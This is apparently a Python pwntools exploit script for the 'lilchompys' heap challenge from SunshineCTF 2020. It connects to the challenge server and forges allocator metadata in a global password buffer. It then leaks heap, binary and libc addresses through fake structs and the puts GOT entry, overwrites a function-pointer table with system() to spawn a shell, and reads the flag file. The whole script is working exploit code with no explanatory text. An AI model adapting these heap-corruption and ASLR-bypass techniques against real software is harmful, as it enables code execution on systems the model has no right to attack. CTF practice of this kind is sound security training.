#!/usr/bin/env python3
from pwn import *
from itertools import cycle, islice

exe = ELF("lilchompys")
context(binary=exe)

DEBUG = 0
REMOTE = 1
SHELL = 1

if REMOTE:
	r = remote("chal.2020.sunshinectf.org", 20003)
	libc = ELF("lilchompys-libc.so", checksec=False)
else:
	r = exe.process()
	
	if DEBUG:
		gdb.attach(r, "c")
	
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so", checksec=False)

if DEBUG:
	context.log_level = "debug"

def menu(choice):
	r.recvuntil(b") Submit finalized theme park design for review\n")
	r.sendline(str(choice))

def add(data, kind=7):
	menu(2)
	
	r.recvuntil(b") Alligator pit\n")
	r.sendline(str(kind + 1))
	
	r.recvuntil(b"Enter a name for the new ")
	r.recvuntil(b":\n")
	r.send(data)

def free_name(lot):
	menu(4)
	
	r.recvuntil(b"Enter the lot number of the amusement to rename:\n")
	r.sendline(str(lot))
	
	r.recvuntil(b"Enter a new name for this attraction:\n")
	r.sendline(b"")
	
	r.recvuntil(b"Attraction name must not be empty!\n")

def demolish(lot):
	menu(3)
	
	r.recvuntil(b"Enter the lot number of the amusement to demolish:\n")
	r.sendline(str(lot))

def rename(lot, data):
	menu(4)
	
	r.recvuntil(b"Enter the lot number of the amusement to rename:\n")
	r.sendline(str(lot))
	
	r.recvuntil(b"Enter a new name for this attraction:\n")
	r.send(data)

def data_units(units, fill=b"A"):
	return bytes(islice(cycle(fill), ((units - 1) * 0x10))) + b"haxx\n"

def add_units(units, kind=7, fill=b"A"):
	add(data_units(units, fill), kind)

def rename_units(lot, units, fill=b"A"):
	rename(lot, data_units(units, fill))

def debug_graph_heap(name):
	if REMOTE or not DEBUG:
		return
	
	menu(7)
	
	r.recvuntil(b"Name:\n")
	r.sendline(name)

def debug_graph_free_tree(name):
	if REMOTE or not DEBUG:
		return
	
	menu(8)
	
	r.recvuntil(b"Name:\n")
	r.sendline(name)

def heap_adj_get_pointer(adj):
	return ((adj >> 20) & ((1 << 44) - 1)) << 4

def heap_adj_get_rba(adj):
	return (adj >> 19) & 1

def heap_adj_get_units(adj):
	return adj & ((1 << 19) - 1)

def heap_adj_make(pointer, rba, units):
	return (pointer >> 4 << 20) | (rba << 19) | (((1 << 19) - 1) & ~units)

# Stage 0: Enter password, which will conveniently have a fake metadata node after it

r.recvuntil(b"Enter password:\n")


password_symbol = [k for k in exe.symbols.keys() if k.startswith("password.")][0]
password_noaslr = exe.symbols[password_symbol]

line_symbol = [k for k in exe.symbols.keys() if k.startswith("line.")][0]
line_noaslr = exe.symbols[line_symbol]

assert((password_noaslr & 0xf) == 0)
fake_meta_noaslr = password_noaslr + 0x10
end_noaslr = (line_noaslr + 50 - 0x10) & ~0xf
distance = end_noaslr - (fake_meta_noaslr + 0x10)
fake_object_units = distance // 0x10
fake_meta2_offset = end_noaslr - line_noaslr

HEAP_META_BOOKEND = (1 << 19) - 3 + 1
fake_meta1 = p64(heap_adj_make(0, 0, HEAP_META_BOOKEND)) + p64(heap_adj_make(0, 1, fake_object_units))
r.sendline(b"lilChompy2020!\x00X" + fake_meta1)


# Stage 1: Leak base address of heap arena

# Step 1
add_units(0x4, 1)
add_units(0x4, 2)
add_units(0x1, 3)

# Step 2
free_name(1)
demolish(2)

# Step 3
add_units(0x1, 2)
rename_units(3, 0x4)

# Step 4
free_name(2)
add_units(0x2, 4)
rename_units(3, 0x3)

# Step 5
free_name(4)
add_units(0x2, 0) #Lot 5

# Step 6
demolish(3)
rename_units(5, 0x1)

menu(1)
r.recvuntil(b"Lot #4: ")

leak = r.recvuntil(b"(arcade game)\n", drop=True)
# info("leak: %r" % leak)

if len(leak) <= 4:
	error("Leak 1 size is suspiciously low: %d" % len(leak))

adj = u64((leak + b"\x00" * (8 - len(leak)))[:8])

pointer = heap_adj_get_pointer(adj)
rba = heap_adj_get_rba(adj)
units = heap_adj_get_units(adj)

# info("adj(pointer=0x%x, rba=%d, units=0x%x)" % (pointer, rba, units))

heap_base = pointer & ~0xfff

info("Heap base is at 0x%x" % heap_base)


# Stage 2: Leak base address of main executable

# Cause t5 to coalesce with the following free block
rename_units(5, 0x3, b"/bin/sh\x00")

# Need to set Attraction.kind to -11 so when it's listed, the
# funToString[-11] will leak &__dso_handle.

index = exe.symbols["__dso_handle"] - exe.symbols["funToString"]
index //= 8

# Attraction{.kind = -11, .name = NULL}
fakeAttraction1 = p64(((1 << 64) + index) & ((1 << 64) - 1)) + p64(0)
rename(2, fakeAttraction1[:7] + b"\n")

menu(1)
r.recvuntil(b"Lot #4: ")
r.recvuntil(b"(")
leak2 = r.recvuntil(b")\n", drop=True)
# info("leak2: %r" % leak2)

if len(leak2) <= 4:
	error("Leak 2 size is suspiciously low: %d" % len(leak2))

dso_handle_addr = u64(leak2 + b"\x00" * (8 - len(leak2)))
aslr_slide = dso_handle_addr - exe.symbols["__dso_handle"]

exe.address += aslr_slide

info("lilchompys base address: 0x%x" % exe.address)


# Stage 3: Leak libc base address

# Freeing t2 will cause the free in the following rename to coalesce
# with this block, forming a 0x30 sized block which allows full control
# over *g_attractions[1].
free_name(2)

# Attraction{.kind = 8, .name = exe.got["puts"]}
fakeAttraction2 = p64(8) + p64(exe.got["puts"])
payload_stage3 = fakeAttraction2 + b"A" * 0x10 + fakeAttraction1
rename(1, payload_stage3[:-1] + b"\n")

menu(1)
r.recvuntil(b"Lot #2: ")
leak3 = r.recvuntil(b" (alligator pit)\n", drop=True)
# info("leak3: %r\n" % leak3)

puts_addr = u64(leak3 + b"\x00" * (8 - len(leak3)))
libc_slide = puts_addr - libc.symbols["puts"]
libc.address += libc_slide

info("libc base address: 0x%x" % libc.address)

# debug_graph_free_tree(b"free.dot")


# Stage 4: Create fake heap region between g_password and g_line

fakeAttraction3 = p64(8) + p64(fake_meta_noaslr + aslr_slide + 0x10)
payload_stage4 = fakeAttraction3 + b"A" * 0x10 + fakeAttraction1
rename(1, payload_stage4[:-1] + b"\n")

# Need to manually free_name(2) in order to plant bytes in g_line
# free_name(2)

menu(4)

r.recvuntil(b"Enter the lot number of the amusement to rename:\n")

payload_fake_meta = b"2\x00"
payload_fake_meta += b"A" * (fake_meta2_offset - len(payload_fake_meta))
fake_meta2 = p64(heap_adj_make(0, 0, fake_object_units)) + p64(heap_adj_make(0, 1, HEAP_META_BOOKEND))
payload_fake_meta += fake_meta2
r.sendline(payload_fake_meta)

r.recvuntil(b"Enter a new name for this attraction:\n")
r.sendline(b"")

r.recvuntil(b"Attraction name must not be empty!\n")

# debug_graph_free_tree(b"free_fake.dot")


# Stage 5: Allocate a few Attraction structs until one's name lands at
# &g_submitFuncs

target_addr = exe.symbols["submitFuncs"]
target_offset = target_addr - (fake_meta_noaslr + aslr_slide + 0x10)
assert((target_offset & 0xf) == 0)
target_units = target_offset // 0x10


def sum_units(sizes):
	units = 1 + 1
	for size in sizes:
		units += size + 1 + 1 + 1
	return units

i = 1
while True:
	tmp = i
	sizes = []
	while tmp != 0:
		if tmp >= 4:
			sizes.append(4)
			tmp -= 4
		else:
			sizes.append(tmp)
			tmp = 0
	
	calculated_units = sum_units(sizes)
	if calculated_units == target_units:
		break
	elif calculated_units > target_units:
		error("Heap layout isn't favorable, probably won't work")
	
	i += 1


info("Plan:")
cur = fake_meta_noaslr + aslr_slide + 0x10

for units in sizes + [1]:
	info("0x%x: Attraction" % cur)
	cur += 0x10
	info("0x%x: meta" % cur)
	cur += 0x10
	info("0x%x: name (size = 0x%x)" % (cur, units * 0x10))
	cur += units * 0x10
	info("0x%x: meta" % cur)
	cur += 0x10


for units in sizes:
	add_units(units, 1, b"\x00")

# This next Attraction's name will overlap with g_submitFuncs. Time to win
payload_stage5 = p64(libc.symbols["system"])
add(payload_stage5 + b"\n", 1)

menu(5)


if SHELL:
    r.interactive()
else:
    # Got a shell, so get the flag!
    r.sendline("cat flag.txt")
    print(r.recvline_contains(b"sun{", timeout=2).decode("utf8"))
